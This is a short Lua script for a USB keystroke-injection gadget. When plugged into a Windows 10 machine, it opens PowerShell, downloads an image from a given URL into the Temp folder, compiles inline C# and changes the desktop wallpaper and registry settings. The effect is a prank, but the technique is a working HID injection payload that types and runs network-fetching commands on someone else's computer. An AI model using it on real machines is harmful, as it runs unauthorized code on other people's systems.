---
--- Created by netdex.
--- DateTime: 1/6/2018 4:33 PM
---
--- wallpaper.lua: Changes a Windows 10 desktop wallpaper
---
---
local file = ask("Wallpaper to download?", "https://i.imgur.com/UhjsQ3x.jpg")

while not cancelled() do
    progress("idle")

    -- poll until /dev/hidg0 is writable
    while not cancelled() and not test() do delay(1000) end
    if cancelled() then break end

    progress("running")
    delay(1000)

    press_keys(kb.LSUPER, kb.R)
    delay(2000)
    send_string("powershell\n")
    delay(2000)
    send_string("[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ..
            "(new-object System.Net.WebClient).DownloadFile('" .. file .. "',\"$Env:Temp\\b.jpg\");\n" ..
            "Add-Type @\"\n" ..
            "using System;using System.Runtime.InteropServices;using Microsoft.Win32;namespa" ..
            "ce W{public class S{ [DllImport(\"user32.dll\")]static extern int SystemParamet" ..
            "ersInfo(int a,int b,string c,int d);public static void SW(string a){SystemParam" ..
            "etersInfo(20,0,a,3);RegistryKey c=Registry.CurrentUser.OpenSubKey(\"Control Pan" ..
            "el\\\\Desktop\",true);c.SetValue(@\"WallpaperStyle\", \"2\");c.SetValue(@\"Tile" ..
            "Wallpaper\", \"0\");c.Close();}}}\n" ..
            "\"@\n" ..
            "[W.S]::SW(\"$Env:Temp\\b.jpg\")\n" ..
            "exit\n")

    progress("done")
    while not cancelled() and test() do
        delay(1000)
    end
end